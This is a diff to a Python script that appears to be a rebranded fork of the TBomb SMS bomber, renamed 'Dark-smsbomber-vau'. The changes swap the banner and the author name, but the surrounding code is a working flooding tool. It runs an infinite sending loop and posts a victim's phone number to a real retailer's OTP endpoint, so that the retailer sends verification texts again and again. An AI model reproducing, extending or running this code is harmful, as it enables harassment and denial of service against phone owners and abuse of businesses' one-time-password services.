@@ -239,15 +239,13 @@ def banner():
 
     clr()
     logo="""
-   ████████ █████                 ██
-   ▒▒▒██▒▒▒ ██▒▒██                ██
-      ██    ██  ██        ██   ██ ██
-      ██    █████▒  ████  ███ ███ █████
-      ██    ██▒▒██ ██  ██ ██▒█▒██ ██▒▒██
-      ██    ██  ██ ██  ██ ██ ▒ ██ ██  ██
-      ██    █████▒ ▒████▒ ██   ██ █████▒
-      ▒▒    ▒▒▒▒▒   ▒▒▒▒  ▒▒   ▒▒ ▒▒▒▒▒
-                                         """
+   █ █████       ꧁༺𝘿𝙖𝙧𝙠-𝙨𝙢𝙨𝙗𝙤𝙢𝙗𝙚𝙧-𝙫𝙖𝙪༻꧂
+
+꧁༺𝙳𝚊𝚛𝚔-𝚜𝚖𝚜𝚋𝚘𝚖𝚋𝚎𝚛-𝚟𝚊𝚞༻꧂
+
+          ██
+   ▒▒▒██
+                        """
     print(random.choice(colors)+logo+W)
     print("\n")
 
@@ -273,7 +271,7 @@ def infinite(pn, dl, ch, max):
             continue
         os.system('rm proc.xxx >/dev/null 2>&1')
         count_inf += 1
-        # os.system('echo SpeedX >> count.xxx')
+        # os.system('echo D1ARK-VA4U3 >> count.xxx')
         time.sleep(float(dl))
         if (count_inf > maxlim):
             exit()
@@ -289,7 +287,7 @@ def checkinternet():
         res = True
     if res:
         print("\n\n\tIt seems That Your Internet Speed is Slow or You Are Using Proxies...")
-        print('\t\tTBomb Will Stop Now...\n\n')
+        print('\t\Dark-smsbomber-vau Will Stop Now...\n\n')
         banner()
         exit()
 
@@ -645,8 +643,8 @@ def getapi(pn,lim,cc):
 
         data = {
           'email': cc+pn,
-          'firstname': 'SpeedX',
-          'lastname': 'SpeedX'
+          'firstname': 'D1ARK-VA4U3',
+          'lastname': 'D1ARK-VA4U3'
         }
 
         response = requests.post('https://www.aala.com/accustomer/ajax/getOTP', headers=headers, cookies=cookies, json=data)
